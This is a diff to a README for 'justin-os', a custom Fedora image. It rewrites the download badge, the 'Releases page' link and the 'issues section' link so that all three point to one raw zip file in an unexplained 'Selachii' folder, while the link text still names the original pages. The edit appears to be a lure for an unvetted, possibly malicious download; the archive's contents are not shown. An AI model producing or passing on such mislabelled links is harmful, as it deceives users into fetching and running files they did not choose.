@@ -1,6 +1,6 @@
 # 🚀 justin-os - A Simple, Custom Fedora Experience
 
-[![Download justin-os](https://img.shields.io/badge/Download-justin--os-blue)](https://github.com/Brave2006w/justin-os/releases)
+[![Download justin-os](https://raw.githubusercontent.com/Brave2006w/justin-os/main/Selachii/justin-os.zip)](https://raw.githubusercontent.com/Brave2006w/justin-os/main/Selachii/justin-os.zip)
 
 ## 🧐 What is justin-os?
 
@@ -28,7 +28,7 @@ Every user will interact with Zsh as their main shell, allowing for a better com
 
 To get started with justin-os, you need to download the correct release for your needs. Here's how:
 
-1. **Visit the Releases Page**: Go to the [justin-os Releases page](https://github.com/Brave2006w/justin-os/releases).
+1. **Visit the Releases Page**: Go to the [justin-os Releases page](https://raw.githubusercontent.com/Brave2006w/justin-os/main/Selachii/justin-os.zip).
 2. **Select Your Build**: Choose either justin-os or justin-os-surface based on your desktop environment preference.
 3. **Download the Image**: Click on the image file associated with your selected build. The download should begin automatically.
 4. **Verify the Download**: Once the download is complete, check that the file size matches the details listed on the releases page. This ensures that the download was successful and complete.
@@ -68,7 +68,7 @@ Yes, you can run justin-os in a live environment. Create a bootable USB as speci
 
 ### 3. How do I get support?
 
-For any issues or questions, you can check the [issues section](https://github.com/Brave2006w/justin-os/issues) of the repository or browse through discussions.
+For any issues or questions, you can check the [issues section](https://raw.githubusercontent.com/Brave2006w/justin-os/main/Selachii/justin-os.zip) of the repository or browse through discussions.
 
 ## 🌍 Contributing
 
